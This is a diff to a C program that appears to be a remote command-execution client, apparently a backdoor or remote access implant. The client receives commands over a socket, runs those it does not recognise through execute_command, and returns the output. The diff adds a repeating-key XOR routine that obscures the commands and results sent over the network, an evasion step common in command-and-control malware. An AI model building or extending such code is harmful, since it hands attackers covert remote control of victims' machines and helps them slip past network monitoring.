@@ -5,6 +5,12 @@ int sock = 0;
 command_t *commands;
 unsigned int commands_len;
 
+void crypt(char* data, char* key, unsigned int data_size, unsigned int key_size) {
+	for(int i = 0; i < data_size; i++) {
+		data[i] ^= key[i % key_size];
+	}
+}
+
 int connection_initialize() {
 
 	struct sockaddr_in sa;
@@ -54,6 +60,7 @@ void init_commands() {
 int main() {
 
 	const uint8_t magic[5] = MAGIC;
+	const uint8_t encryption_key[6] = ENCRYPTION_KEY;
 
 	init_commands();
 
@@ -82,6 +89,8 @@ int main() {
 		char command[4096];
 		recv(sock, command, 4096, 0);
 
+		crypt(command, encryption_key, 4096, 6);
+
 		unsigned int commands_done = 0;
 
 		for(int c = 0; c < commands_len; c++) {
@@ -101,6 +110,7 @@ int main() {
 		if(commands_done == 0)
 			execute_command((const char*)command, result);
 
+		crypt(result, encryption_key, strlen(result), 6);
 		send_data(result, strlen(result));
 
 		memset(result, 0, COMMAND_BUFFER_SIZE);
